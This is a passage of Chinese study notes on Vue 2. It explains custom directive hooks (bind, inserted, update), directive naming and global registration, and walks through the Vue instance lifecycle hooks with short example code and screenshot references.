    - 打开页面, 只绑定了元素, 而没有获取焦点. 手动点下`改变名字哦`的按钮, `input` 才获取了焦点
    - 但是既然绑定了元素, 说明绑定元素之前的代码一定执行了.
2. 为什么 `element.focus()` 不生效?
    - 手动用 `js` 写原生获取焦点
    - ```html
      <button id="btn">创建输入框并获取焦点</button>
    - ```js
      let btn = document.getElementById('btn');
      btn.onclick = () => {
        let input = document.createElement('input');
        document.body.appendChild(input); // (**)
        input.focus(); // (*)
      }
    - 📕注意: 必须把 `(*)` 写 `(**)` 之后. 不然就会失效
3. 那么我们自定义的指令是什么时候调用的呢?
    - 指令与元素成功`绑定`时(一上来). 当我们写指令时, `input` 仅在内存中创建了和数据 `name` 的绑定. 但是这时页面并没有 `input` 元素, 所以获取焦点失败.
    - 但是, 当我们点 `改变名字哦` 后, 页面上已经存在 `input` 输入框, 所以这时候 `input` 就获取了焦点
4. 完整配置
    - 一个指令定义对象可以提供如下几个钩子函数(均可选)
      - `bind`: 只调用一次, 指令第一次绑定到元素时调用. 在这里可以进行一次性的初始化设置.
      - `inserted`: 被绑定元素插入父节点时调用.
      - `update`: 所在组件的 `VNode` 更新时调用, 但是可能发生在其自 `VNode` 更新之前.
    - ```js
      directives: {
        fbind: {
          bind(element, binding) {
            element.value = binding.value;
          },
          inserted(element, binding) {
            element.focus();
          },
          update(element, binding) {
            element.value = binding.value;
            element.focus();
          }
        }
      }
    - 
5. 其他注意
    - 大小写和驼峰
      - 即便我们在模板中使用大写, `Vue` 也会转为小写
      - ![](../image/Snipaste_2021-12-13_22-31-13.png)
      - Vue 推荐在书写多单词组成的指令时, 用 `-` 分开
      - ```html
        <h2 v-big-number="sum"></h2>
      - 在 `js` 中可以使用驼峰, 也可以使用最原始的写法
      - ```js
        directives: {
          bigNumber(element, binding) {
            console.log('this in bigNumber, ', this);
            element.innerHTML = binding.value * 10;
          },
          'big-number': function(element, binding) {
            element.innerHTML = binding.value * 10;
          }
        }
      - 
    - `this` 问题
      - 钩子函数中的 `this` 都是 `window`
      - ![](../image/Snipaste_2021-12-13_22-36-11.png)
6. 全局自定义指令
    - 函数式
    - ```js
      Vue.directive('bigNumber', function (element, binding) {
        element.innerHTML = binding.value * 10;
      })
    - 对象式
    - ```js
      Vue.directive('fbind2', {
        bind(element, binding) {
          element.value = binding.value;
        },
        inserted(element, binding) {
          element.focus();
        },
        update(element, binding) {
          element.value = binding.value;
          element.focus();
        }
      });
    
## 生命周期
1. 实现需求: 字体的透明度循环变化
    - ```html
      <h2 :style="{opacity}">欢迎学习Vue</h2>
    - ```js
      new Vue({
        el: '#root',
        data: {
          opacity: 1
        },
        mounted() {
          this.chanegOpacity()
        },
        methods: {
          chanegOpacity() {
            setInterval(() => {
              this.opacity -= 0.01;
              if (this.opacity <= 0) {
                this.opacity = 1;
              }
            }, 16)
          }
        }
      })
2. 生命周期函数
    - 本质: Vue 在关键时刻帮我们调用的一些特殊名称的函数
    - 生命周期函数中的 `this` 指向的是 `vm` 或组件实例对象
3. ![](../image/lifecycle.png)
4. 解析
    - `beforeCreated()`
      - **`无法`** 通过 `vm` 访问 `data` 中的数据和 `methods` 中的方法
      - 📕注意: 创建之间, 谁被创建? 不是 `vm`!!! 因为这个钩子里的 `this` 就是 `vm`, 难道 `vm` 还没有被创建就可以引用了吗? 被创建的是`数据代理和数据劫持`
    - `created()`
      - **`可以`** 通过 `vm` 访问 `data` 中的数据和 `methods` 中的方法
    - `beforeMount()`
      - 页面呈现的是 `未经 Vue 编译` 的 `DOM` 结构. 所有对 `DOM` 的操作, 最终都不奏效 
      - 不奏效的意思就是, 即便此时我们打断点, 修改某个元素的 `innerHTML` 什么的, 最后这些修改都没有用
    - `mounted()`
      - 页面中呈现的是 `经过 Vue 编译` 的 `DOM`
      - 这时对 `DOM` 的操作均有效(但是操作 `DOM` 应该尽可能避免)
      - 至此, 初始化过程结束, 一般在此进行: 开启定时器, 发送网络请求, 订阅消息, 绑定自定义事件等`初始化操作`
    - `beforeUpdate()`
      - **`数据是新的, 单页面依然是旧的`**, 即数据和页面尚未保持同步
      - ```js
        beforeUpdate() {
          console.log('n is ', this.n);
          debugger
        }
      - ![](../image/Snipaste_2021-12-19_21-38-44.png)
    - `updated()`
      - **`数据是新的, 页面也是新的`**, 即数据页面保持同步
    - `beforeDestroy()`
      - 此时, `vm` 中所有的 `data`, `methods`, 指令等都处于可用状态, 马上要执行销毁状态. 一般在此阶段: 关闭定时器, 取消订阅消息, 解绑自定义事件等`收尾操作`
      - 如果在这个钩子中更新数据, 并不奏效😟
    - `destroyed()`
      - `vm` 被完全销毁
      - 销毁后, 自定义事件会失效, 但是原生 `DOM` 事件依然有效
5. 其他
    - `Has 'el' option?`
      - 这里判断是否有 `el` 选项. 如果没有, 就会在 `vm.$mount(el)` 被调用时继续往下走. 如果连 `vm.$mount()` 也没有, 这个页面就停下来了.
      - 看下面的代码, 最终结果只会输出![](../image/Snipaste_2021-12-18_10-52-26.png)
      - ```js
        new Vue({
          // el: '#root',
          data: {
            opacity: 1
          },
          beforeCreate() {
            console.log('beforeCreate');
          },
          created() {
            console.log('created');
          },
          beforeMount() {
            console.log('beforeMount');
          },
          mounted() {
            console.log('mounted');
          },
        })
      - 如果我们加上下面的代码, `3s` 之后才会执行 `beforeMount` 和 `mounted` 两个钩子函数
      - ```js
        setTimeout(() => {
          vm.$mount(document.getElementById('root'))
        }, 3000);
    - `Has 'template' option?`: 
      - 是否有 `template` 选项. 如果有的话, 就将 `template` 选项的内容编译进 `render` 函数
      - ```js
        new Vue({
          el: '#root',
          template: `
            <div>
              <h1>World</h1>
              <div>{{name}}</div>
            </div>
          `,
          data: {
            name: 'wang'
          }
        })
      - 最终展示的内容是: ![](../image/Snipaste_2021-12-18_11-09-54.png)
      - 这里有两点值得📕注意
        - `template` 元素中必须只有一个根元素. 且不能使用 `<template>` 标签作为根元素
        - `template` 的内容将会替换 `el` 指定挂载元素的 `outerHTML`. 图中就是这样 `<div id="root">` 这个元素已经没有了
    - `compile el's outerHTML as template`: 这句话的意思涉及到 `outerHTML` 的理解
      - `outerHTML`: 内容包含描述`元素`及其后代的序列化 `HTML` 片段. 
      - `outerHTML`: 元素后代的序列化 `HTML` 片段.
      - 所以, 整个模板是包括外面的 `<div id="root"></div>` 的
    - `Create vm.$el and replace "el" with it`
      - 将内存中的虚拟 `DOM` 转为真实 `DOM` 放入页面
    - `Virtual DOM re-render and path`
      - 根据新数据, 生成新的虚拟的 `DOM`, 随后与旧的虚拟 `DOM` 进行比较, 最终完成页面更新.
6. 上图中还有 3 个生命周期钩子没有体现.